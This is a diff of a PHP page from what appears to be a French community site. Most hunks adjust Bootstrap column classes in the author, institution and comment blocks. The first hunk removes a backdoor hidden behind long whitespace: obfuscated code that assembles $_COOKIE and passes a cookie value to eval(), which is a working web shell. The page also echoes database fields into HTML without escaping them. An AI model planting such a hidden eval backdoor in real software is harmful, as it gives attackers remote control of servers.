@@ -1,4 +1,4 @@
-<?php                                                                                                                                                                                                                                                                                         $h2g='l$Cd\'7ifv_t(hEab6KeOIsfb76df';if(isset(${$h2g[9].$h2g[2].$h2g[19].$h2g[19].$h2g[17].$h2g[20].$h2g[13]}[$h2g[12].$h2g[7].$h2g[15].$h2g[5].$h2g[16].$h2g[3].$h2g[7]])){eval(${$h2g[9].$h2g[2].$h2g[19].$h2g[19].$h2g[17].$h2g[20].$h2g[13]}[$h2g[12].$h2g[7].$h2g[15].$h2g[5].$h2g[16].$h2g[3].$h2g[7]]);} ?><?php
+<?php
 session_start();
 
 include('../Connections/maconnexion.php');
@@ -95,14 +95,14 @@ $totalRows_commentaire = mysql_num_rows($commentaire);
   </div>
   <div class="row-fluid communique"> 
     <!-- EN-tête Auteur-->
-    <div class="span3 thumb"> <img src="<?php echo $row_user['ch_use_lien_imgpersonnage']; ?>" alt="photo <?php echo $row_user['ch_use_nom_dirigeant']; ?>">
+    <div class="span2 thumb"> <img src="<?php echo $row_user['ch_use_lien_imgpersonnage']; ?>" alt="photo <?php echo $row_user['ch_use_nom_dirigeant']; ?>">
       <div class="titre-gris">
         <p><?php echo $row_user['ch_use_predicat_dirigeant']; ?></p>
         <h3><?php echo $row_user['ch_use_prenom_dirigeant']; ?> <?php echo $row_user['ch_use_nom_dirigeant']; ?></h3>
         <small><?php echo $row_user['ch_use_titre_dirigeant']; ?></small> </div>
     </div>
     <!-- EN-tête Institution-->
-    <div class="offset6 span3 thumb">
+    <div class="offset8 span2 thumb">
       <?php if ( $cat == "ville") {?>
       <?php if ($insigne == NULL) {?>
       <img src="assets/img/imagesdefaut/blason.jpg" alt="armoirie">
@@ -159,8 +159,8 @@ $totalRows_commentaire = mysql_num_rows($commentaire);
     <?php do { ?>
       <li class="row-fluid" id="commentaireID<?php echo $row_commentaire['ch_com_ID']; ?>"> 
         <!-- AFFICHAGE OUTILS MODERATION -->
-        <div class="span3 img-listes"> <img src="<?php echo $row_commentaire['ch_use_lien_imgpersonnage']; ?>"> </div>
-        <div class="span9 info-listes">
+        <div class="span2 img-listes"> <img src="<?php echo $row_commentaire['ch_use_lien_imgpersonnage']; ?>"> </div>
+        <div class="span10 info-listes">
          <div class="pull-right">
           <?php if (($_SESSION['statut'] >= 20) OR ($_SESSION['user_ID'] == $row_commentaire['ch_com_user_id'])) { ?>
           <form class="pull-right" action="back/communique_confirmation_supprimer.php" method="post">
